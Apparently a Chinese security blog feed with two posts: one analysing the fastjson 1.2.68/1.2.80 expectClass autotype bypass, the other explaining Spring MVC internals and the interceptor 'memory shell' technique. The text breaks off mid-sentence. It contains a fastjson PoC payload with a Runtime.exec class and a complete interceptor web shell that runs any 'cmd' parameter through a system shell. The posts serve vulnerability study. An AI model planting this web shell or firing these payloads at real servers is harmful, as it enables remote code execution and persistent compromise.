href="#fastjson-1-2-68-期望类利用-AutoCloseable" class="headerlink" title="fastjson 1.2.68 期望类利用(AutoCloseable)"></a>fastjson 1.2.68 期望类利用(AutoCloseable)</h2><p>在1.2.48中已经修复了缓存机制的绕过, 而在1.2.68中又爆出了新的利用方式, 利用expectClass<br>实现了<code>java.lang.AutoCloseable</code>接口的类可以被反序列化</p><p>&#x3D;&#x3D;为什么<code>java.lang.AutoCloseable</code>的实现类会被利用?&#x3D;&#x3D;<br>一些文件操作的类是实现了<code>java.lang.AutoCloseable</code>接口的, 在浅蓝师傅的文章中提到可以去挖掘文件操作的类作为新的gadget:</p><p><a href="https://b1ue.cn/archives/382.html">fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路</a></p><p>本篇只讨论fastjosn本身的绕过, 不研究gadget(懒..</p><p>这里用下面的demo来测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">AttackVersion_1_2_68</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;EvilClass.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;&#125;&quot;</span>;  </span><br><span class="line">    System.out.println(poc);  </span><br><span class="line">    <span class="keyword">return</span> poc;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> EvilClass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(cmd);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;<code>java.lang.AutoCloseable</code>存在于默认的mapings中&#x3D;&#x3D;, 所以能够通过checkAutoType的检查,<br>json解析器通过<code>java.lang.AutoCloseable</code>获取对应的反序列化器为一个<code>JavaBeanDeserializer</code>(<code>config.getDeserializer</code>的逻辑是经过一系列判断后还未找到与其对应的反序列化器时, 就构造一个JavaBeanDeserializer, 即使这个类并不是一个JavaBean), <code>JavaBeanDeserializer</code>解析到后面的<code>@type</code>, 拿到对应的类名<code>EvilClass.VulAutoCloseable</code> , 又会尝试去获取<code>EvilClass.VulAutoCloseable</code>的反序列化器, 在此之前会对此类名进行<code>checkAutoType</code>检查, 此时会将<code>java.lang.AutoCloseable</code>作为期望类传入, 但这个版本AutoType会校验<code>EvilClass.VulAutoCloseable</code>和期望类, 具体如下:</p><p>期望类不能是下面几种:<br>(可以看见这里是没有禁用<code>java.lang.AutoCloseable</code>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Object.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Serializable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Cloneable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Closeable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">EventListener</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Iterable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Collection</span>.class </span><br></pre></td></tr></table></figure><p><code>EvilClass.VulAutoCloseable</code>不能实现以下接口(或类继承)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ClassLoader.class <span class="comment">// classloader is danger  </span></span><br><span class="line">javax.sql.DataSource.class <span class="comment">// dataSource can load jdbc driver  </span></span><br><span class="line">javax.sql.RowSet.class</span><br></pre></td></tr></table></figure><p>由于很多jndi的利用类都是实现了<code>javax.sql.DataSource.class</code>和<code>javax.sql.RowSet.class</code>, 这里的限制就导致了很难再进行jndi注入了</p><p>我们还是跟踪代码过一遍调试<br>前面的不必多说, 从<code>DefaultJSONParser</code>解析出<code>java.lang.AutoCloseable</code>开始<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603100421.png" alt="image.png"><br>对<code>java.lang.AutoCloseable</code>进行checkAutoType检查, 跟进<br>&#x3D;&#x3D;<code>java.lang.AutoCloseable</code>是存在于默认的mappings中的&#x3D;&#x3D;(也就是我们再之前利用缓存绕过的那个mappings)</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603101026.png" alt="image.png"></p><p>从mappings中拿到class, 在1374行返回<br>回到<code>DefaultJSONParser</code>, 往下走, 拿到其反序列化器, 是一个<code>JavaBeanDeserializer</code>, 跟进反序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603101420.png" alt="image.png"></p><p>再跟进, 后面json字符串扫描过程和之前一样的, 依旧是扫描到<code>@type</code>的值后再checkAutoType, 再尝试获取反序列化器<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102044.png" alt="image.png"><br>注意此时对<code>EvilClass.VulAutoCloseable</code>进行checkAutoType时传入了期望类<code>AutoCloseable</code> 跟进<br>这里有期望类的黑名单<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102437.png" alt="image.png"></p><p>在这里, 我们的自定义的类被加载<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102755.png" alt="image.png"></p><p>再往下, 对被check的类做了一些检查, 不能继承黑名单中的接口或类, 且需要继承期望类<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102604.png" alt="image.png"><br>通过检查后, 返回到json解析器, 之后就是拿到反序列化器进行反序列化的过程了, 最终就是和之前一样, 调用构造器实例化这个类, 然后调用它的getter和setter为其添加属性</p><p>此利用方式在1.2.69被修复, 修复方式就是黑名单, 并且这次对期望类的黑名单也改为了哈希<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603140542.png" alt="image.png"></p><h2 id="fastjson-1-2-80-期望类利用-异常类Throwable"><a href="#fastjson-1-2-80-期望类利用-异常类Throwable" class="headerlink" title="fastjson 1.2.80 期望类利用(异常类Throwable)"></a>fastjson 1.2.80 期望类利用(异常类Throwable)</h2><p>1.2.68的修复方式简单粗暴，将<code>java.lang.Runnable</code>、<code>java.lang.Readable</code>和<code>java.lang.AutoCloseable</code>加入了黑名单，那么1.2.80用的就是另一个期望类：异常类Throwable。</p><p>触发过程和之前的一样AutoCloseable一样, 困难点就是在于寻找对应的gadget了</p><h2 id="fastjson-1-2-80-期望类利用-Exception"><a href="#fastjson-1-2-80-期望类利用-Exception" class="headerlink" title="fastjson 1.2.80 期望类利用(Exception)"></a>fastjson 1.2.80 期望类利用(Exception)</h2><p>依旧困难点是在于寻找对应的gadget了, 最近的京麒2025在最新版本1.2.83也是利用的这个期望类</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4er.com/posts/fastjson-1.2.80/">y4er.com# fastjson 1.2.80 漏洞分析</a><br><a href="https://b1ue.cn/archives/382.html">b1ue.cn# fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路</a><br><a href="https://mp.weixin.qq.com/s/l1J4cGfqI_SssGKML7-z3w">https://mp.weixin.qq.com/s/l1J4cGfqI_SssGKML7-z3w</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;fastjson&quot;&gt;&lt;a href=&quot;#fastjson&quot; class=&quot;headerlink&quot; title=&quot;fastjson&amp;lt;&amp;#x3D;1.2.24 反序列化漏洞（CVE-2017-18349)&quot;&gt;&lt;/a&gt;fastjson&amp;lt;&amp;#x3D;1.2.2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Spring架构原理 &amp; Spring内存马</title>
    <link href="http://example.com/2025/09/10/Spring%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Spring%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://example.com/2025/09/10/Spring%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Spring%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2025-09-10T06:40:14.000Z</published>
    <updated>2025-09-10T06:40:44.770Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Spring架构原理-Spring内存马"><a href="#Spring架构原理-Spring内存马" class="headerlink" title="Spring架构原理 &amp; Spring内存马"></a>Spring架构原理 &amp; Spring内存马</h1><h3 id="spring-mvc流程"><a href="#spring-mvc流程" class="headerlink" title="spring mvc流程"></a>spring mvc流程</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805192207.png" alt="image.png"></p><h4 id="1-Spring-MVC的核心组件和大致处理流程"><a href="#1-Spring-MVC的核心组件和大致处理流程" class="headerlink" title="1.Spring MVC的核心组件和大致处理流程"></a>1.Spring MVC的核心组件和大致处理流程</h4><ol><li><p>DispatcherServlet是前端控制器，它负责接收Request并将Request转发给对应的处理组件；</p></li><li><p>HandlerMapping负责完成url到Controller映射，可以通过它来找到对应的处理Request的Controller；</p></li><li><p>Controller处理Request，并返回ModelAndVIew对象，ModelAndView是封装结果视图的组件；④~⑦表示视图解析器解析ModelAndView对象并返回对应的视图给客户端。</p></li></ol><h4 id="2-IOC容器"><a href="#2-IOC容器" class="headerlink" title="2.IOC容器"></a>2.IOC容器</h4><p>IOC（控制反转）容器是Spring框架的核心概念之一，它的基本思想是将对象的创建、组装、管理等控制权从应用程序代码反转到容器，使得应用程序组件无需直接管理它们的依赖关系。IOC容器主要负责对象的创建、依赖注入、生命周期管理和配置管理等。Spring框架提供了多种实现IOC容器的方式，下面讲两种常见的：</p><p>BeanFactory：Spring的最基本的IOC容器，提供了基本的IOC功能，只有在第一次请求时才创建对象。ApplicationContext：这是BeanFactory的扩展，提供了更多的企业级功能。ApplicationContext在容器启动时就预加载并初始化所有的单例对象，这样就可以提供更快的访问速度。</p><h4 id="3-Spring-MVC-九大组件"><a href="#3-Spring-MVC-九大组件" class="headerlink" title="3.Spring MVC 九大组件"></a>3.Spring MVC 九大组件</h4><p>这九大组件需要有个印象：</p><p>&#x3D;&#x3D;DispatcherServlet（派发Servlet)&#x3D;&#x3D;：负责将请求分发给其他组件，是整个Spring MVC流程的核心；<br>&#x3D;&#x3D;HandlerMapping（处理器映射)&#x3D;&#x3D;：用于确定请求的处理器（Controller）；<br>&#x3D;&#x3D;HandlerAdapter（处理器适配器)&#x3D;&#x3D;：将请求映射到合适的处理器方法，负责执行处理器方法；<br>&#x3D;&#x3D;HandlerInterceptor（处理器拦截器）&#x3D;&#x3D;：允许对处理器的执行过程进行拦截和干预；<br>&#x3D;&#x3D;Controller（控制器）&#x3D;&#x3D;：处理用户请求并返回适当的模型和视图；<br>&#x3D;&#x3D;ModelAndView（模型和视图）&#x3D;&#x3D;：封装了处理器方法的执行结果，包括模型数据和视图信息；<br>&#x3D;&#x3D;ViewResolver（视图解析器）&#x3D;&#x3D;：用于将逻辑视图名称解析为具体的视图对象；<br>&#x3D;&#x3D;LocaleResolver（区域解析器）&#x3D;&#x3D;：处理区域信息，用于国际化；<br>&#x3D;&#x3D;ThemeResolver（主题解析器）&#x3D;&#x3D;：用于解析Web应用的主题，实现界面主题的切换。</p><h4 id="九大组件初始化"><a href="#九大组件初始化" class="headerlink" title="九大组件初始化"></a>九大组件初始化</h4><p>首先是 位于 <code>org.springframework:spring-webmvc</code>的:<br><code>org.springframework.web.servlet.DispatcherServlet</code>, 查看其类结构, 没有一个总体的init方法, 其父类<code>FrameworkServlet</code>也一样, 但在其父类的父类<code>HttpServletBean</code>存在init方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805193420.png" alt="image.png"></p><p>其中的逻辑暂且不论, 关键在最后的<code>initServletBean();</code>方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805193832.png" alt="image.png"></p><p>这个方法接口是留给子类实现的</p><p>FrameworkServlet对这个方法进行了实现<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805194018.png" alt="image.png"><br>其中调用了<code>initWebApplicationContext</code>方法来初始化IOC容器<br>其中会调用到onRefresh<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805194445.png" alt="image.png"></p><p>这个方法也是留给子类实现的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805194539.png" alt="image.png"><br>看注释就知道这是在context刷新hou被调用用来执行一些特定于 Servlet的功能<br>DispatcherServlet对其进行了实现,  可以砍价其中的逻辑就是对九大组件的初始化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805194828.png" alt="image.png"></p><h3 id="SpringMVC-框架Interceptor组件"><a href="#SpringMVC-框架Interceptor组件" class="headerlink" title="SpringMVC 框架Interceptor组件"></a>SpringMVC 框架Interceptor组件</h3><p>TestInterceptor.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springdemo.demos.web;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span> <span class="keyword">extends</span> <span class="title class_">HandlerInterceptorAdapter</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                java.io.<span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();  </span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">                ProcessBuilder processBuilder;  </span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;  </span><br><span class="line">                    processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);  </span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">                    processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd);  </span><br><span class="line">                &#125;  </span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">inputScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(processBuilder.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);  </span><br><span class="line">                output = inputScanner.hasNext() ? inputScanner.next(): output;  </span><br><span class="line">                inputScanner.close();  </span><br><span class="line">                writer.write(output);  </span><br><span class="line">                writer.flush();  </span><br><span class="line">                writer.close();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored)&#123;&#125;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要将TestInterceptor注册进去<br>WebConfig.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springdemo.demos.web;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Configuration</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;  </span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">TestInterceptor</span>()).addPathPatterns(<span class="string">&quot;/**&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805195642.png" alt="image.png"></p><h4 id="Spring-Interceptor引入与执行流程分析"><a href="#Spring-Interceptor引入与执行流程分析" class="headerlink" title="Spring Interceptor引入与执行流程分析"></a>Spring Interceptor引入与执行流程分析</h4><p>&#x3D;&#x3D;Spring Interceptor&#x3D;&#x3D;和&#x3D;&#x3D;Filter&#x3D;&#x3D;的区别</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>主要区别</strong></td><td><strong>拦截器</strong></td><td><strong>过滤器</strong></td></tr><tr><td>机制</td><td>Java反射机制</td><td>函数回调</td></tr><tr><td>是否依赖Servlet容器</td><td>不依赖</td><td>依赖</td></tr><tr><td>作用范围</td><td>对action请求起作用</td><td>对几乎所有请求起作用</td></tr><tr><td>是否可以访问上下文和值栈</td><td>可以访问</td><td>不能访问</td></tr><tr><td>调用次数</td><td>可以多次被调用</td><td>在容器初始化时只被调用一次</td></tr><tr><td>IOC容器中的访问</td><td>可以获取IOC容器中的各个bean（基于FactoryBean接口）</td><td>不能在IOC容器中获取bean</td></tr></tbody></table><p>Servlet只在第一次访问时才会被加载<br>断点打在HttpServletBean的init方法, 来看看请求是如何被处理的<br>看这个调用栈非常熟悉, 还是tomcat那一套<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805201205.png" alt="image.png"><br>之后就是上面的流程</p><p>加载完后 在<code>DispatcherServlet#doDispatch</code>方法也打上断点, 来看看<code>Dispatcher</code>是如何处理请求的</p><p>调用栈如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">doDispatch:<span class="number">1047</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">964</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">1006</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:<span class="number">898</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">670</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">883</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">779</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">227</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">100</span>, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">93</span>, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">197</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">97</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">541</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">135</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">360</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">399</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">893</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1789</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>从这里可以看出来Dispatcher就是一个之前tomcat中的Servlet</p><p>往下走调用了getHandler这个函数<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805204345.png" alt="image.png"><br>跟进去, 看注释知道他会返回一个与此次request对应的<code>HandlerExecutionChain</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805204459.png" alt="image.png"><br>其中的逻辑是通过<code> mapping.getHandler(request);</code>来尝试获取handler, 只要获取到就返回<br>跟进去看看这个方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805223552.png" alt="image.png"></p><ol><li>先是通过getHandlerInternal来获取，如果获取不到，那就调用getDefaultHandler来获取默认的，如果还是获取不到，就直接返回null；</li><li>然后检查handler是不是一个字符串，如果是，说明可能是一个Bean的名字，这样的话就通过ApplicationContext来获取对应名字的Bean对象，这样就确保 handler 最终会是一个合法的处理器对象；</li><li>接着检查是否已经有缓存的请求路径，如果没有缓存就调用 <code>initLookupPath(request)</code> 方法来初始化请求路径的查找；</li><li>最后通过 <code>getHandlerExecutionChain</code> 方法创建一个处理器执行链。</li></ol><p>跟进到<code>getHandlerExecutionChain</code>方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805223944.png" alt="image.png"></p><ol><li>如果 handler 已是 HandlerExecutionChain 类型，则直接使用；</li><li>否则新建一个包装该处理器的执行链，遍历所有adaptedInterceptors拦截器，若拦截器是 MappedInterceptor 类型且匹配当前请求，则将其加入执行链。</li><li>返回最终的执行链对象。<br>这样就得到了<code>executionChain</code></li></ol><p>回到getHandler方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805224234.png" alt="image.png"><br>后面是对于需要跨域的请求的处理</p><p>之后回到doDispatch 到applyPreHandle就是遍历执行各个interceptor<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805224649.png" alt="image.png"><br>可以看见执行到了preHandle方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805224748.png" alt="image.png"></p><h4 id="interceptor型内存马"><a href="#interceptor型内存马" class="headerlink" title="interceptor型内存马"></a>interceptor型内存马</h4><p>思路<br>Spring Interceptor型内存马的编写思路：</p><ol><li>获取ApplicationContext</li><li>通过AbstractHandlerMapping反射来获取adaptedInterceptors</li><li>将要注入的恶意拦截器放入到adaptedInterceptors中</li></ol><p>简单思路：</p><ol><li>获取当前运行环境的上下文</li><li>实现恶意Interceptor</li><li>注入恶意Interceptor</li></ol><p>★当一个Request发送到Spring应用时，大致会经过如下几个层面才会进入Controller层：<br>    &#x3D;&#x3D;<code>HttpRequest</code>&#x3D;&#x3D;–&gt; &#x3D;&#x3D;Filter&#x3D;&#x3D; –&gt; &#x3D;&#x3D;<code>DispactherServlet</code>&#x3D;&#x3D; –&gt; &#x3D;&#x3D;<code>Interceptor</code>&#x3D;&#x3D; –&gt; &#x3D;&#x3D;Controller&#x3D;&#x3D;<br>下面的问题就是如何动态地注册一个恶意的Interceptor了。</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250806163941.png" alt="image.png"></p><p>可以看见只要反射修改<code>AbstractHandlerMapping</code>即可</p><p>我们当前类是<code>RequestMappingHandlerMapping</code>显然是继承了<code>AbstractHandlerMapping</code><br>调用栈往回调, 就能看见这个类的来历, 他是<code>DispatcherServlet</code>的<code>this.handlerMappings</code>中其中一个mapping, 听名字就知道是作用于一个request的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250806164409.png" alt="image.png"></p><p>按照之前tomcat的思路, 